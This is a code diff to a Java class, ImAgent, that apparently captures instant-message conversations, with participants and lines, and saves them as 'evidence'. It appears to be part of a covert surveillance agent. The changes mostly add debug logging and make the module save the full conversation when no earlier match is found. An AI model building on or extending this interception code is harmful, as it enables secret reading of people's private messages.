@@ -89,13 +89,20 @@ public final class ImAgent extends Agent implements BacklightObserver,
         //#endif
         if (markup.isMarkup()) {
             try {
-                byte[] content = markup.readMarkup();
-                lastLine = Line.unserialize(content);
+                byte[] data = markup.readMarkup();
+
+                //#ifdef DEBUG
+                debug.trace("unserialize: " + Utils.byteArrayToHex(data));
+                //#endif
+
+                lastLine = Line.unserialize(data);
                 //#ifdef DEBUG
                 debug.trace("unserialize: " + lastLine);
                 //#endif
             } catch (IOException e) {
-                e.printStackTrace();
+                //#ifdef DEBUG
+                debug.error("unserialize: " + e);
+                //#endif
             }
         }
         return null;
@@ -105,7 +112,13 @@ public final class ImAgent extends Agent implements BacklightObserver,
         //#ifdef DEBUG
         debug.trace("serialize: " + lastLine);
         //#endif
+
         byte[] data = lastLine.serialize();
+
+        //#ifdef DEBUG
+        debug.trace("serialize: " + Utils.byteArrayToHex(data));
+        //#endif
+
         if (!markup.isMarkup()) {
             markup.createEmptyMarkup();
         }
@@ -220,16 +233,16 @@ public final class ImAgent extends Agent implements BacklightObserver,
     }
 
     public void add(String partecipants, Vector lines) {
-        //#ifdef DEBUG
-        debug.trace("add");
-        //#endif
-
         if (lines == null) {
             //#ifdef DEBUG
             debug.error("add: null lines");
             //#endif
             return;
         }
+
+        //#ifdef DEBUG
+        debug.trace("add : " + partecipants + " lines: " + lines.size());
+        //#endif
 
         //#ifdef DBC
         Check.asserts(lines != null, "null lines");
@@ -252,9 +265,23 @@ public final class ImAgent extends Agent implements BacklightObserver,
             }
         }
 
+        if (lastEqual <= 0) {
+            lastEqual = 0;
+            //#ifdef DEBUG
+            debug.info("add: no found, save everything.");
+            //#endif
+        }
+
         lastLine = (Line) lines.lastElement();
+        //#ifdef DEBUG
+        debug.trace("add, serialize lastLine: " + lastLine);
+        //#endif
         serialize(lastLine);
         writeEvidence(partecipants, lines, lastEqual + 1);
+
+        //#ifdef DEBUG
+        debug.trace("add end");
+        //#endif
     }
 
     private void writeEvidence(String partecipants, Vector lines, int startFrom) {
